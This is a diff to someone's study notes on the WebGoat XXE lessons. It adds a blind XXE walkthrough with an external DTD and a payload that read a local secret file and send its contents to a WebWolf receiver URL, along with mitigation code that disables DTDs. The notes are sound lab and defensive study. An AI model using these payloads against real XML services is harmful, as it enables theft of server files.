@@ -137,7 +137,7 @@ Exploit example:
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY ping SYSTEM 'http://localhost:9090/landing'>
+<!ENTITY send SYSTEM 'http://localhost:9090/landing'>
 ```
 
 - Submit the following xml in order to invoke the `attack.dtd`
@@ -149,7 +149,7 @@ Exploit example:
 	%remote;
 ]>
 <comment>
-  <text>test&ping;</text>
+  <text>&send;</text>
 </comment>
 ```
 
@@ -157,24 +157,63 @@ Exploit example:
 
 ### 11. Blind XXE assignment
 
-foo.dtd
+In DTD:
+
+- `% declared_variable`
+- `%invoked_variable;`
+
+In XML:
+
+- `&invoked_variable;`
+
+N.B.: It is not possible refer to an entity from another entity in the same DOCTYPE.
+A possible workaround is to construct the URL with data coming from other entities.
+
+Attack phases:
+
+- the payload loads the remote dtd file (through `%dtd;`)
+- the dtd file refers to `file` (`%file;`)
+- `file` (defined in the payload) is loaded from the file system
+- the payload performs `send` (`&send;`)
+- in order to perform `send`, `all` from the dtd file is executed (`%all;`)
+- HTTP request is performed
+
+injection.dtd
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY foo SYSTEM 'http://localhost:9090/landing/xyz'>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:9090/landing?text=%file;'>"> %all;
 ```
 
-
+Payload:
 
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE author [
-	<!ENTITY % remote SYSTEM "http://localhost:9090/files/newbie/fool.dtd">
-	%remote;
+	<!ENTITY % file SYSTEM "file:///home/mastinux/.webgoat-8.1.0//XXE/secret.txt">
+	<!ENTITY % dtd SYSTEM "http://localhost:9090/files/newbie/injection.dtd">
+	%dtd;
 ]>
 <comment>
-	<text> &foo; </text>
+  <text> &send; </text>
 </comment>
 ```
 
-TODO
+From 'WebWolf' > 'Incoming Request': `WebGoat 8.0 rocks... (ZWYWLAwxmi)`
+
+### 12. XXE mitigation
+
+- ignore DTD:
+
+```java
+XMLInputFactory xif = XMLInputFactory.newFactory();
+xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
+```
+
+- if unable to ignore DTD, ignore external entities:
+
+```java
+XMLInputFactory xif = XMLInputFactory.newFactory();
+xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
+xif.setProperty(XMLInputFactory.SUPPORT_DTD, true);
+```
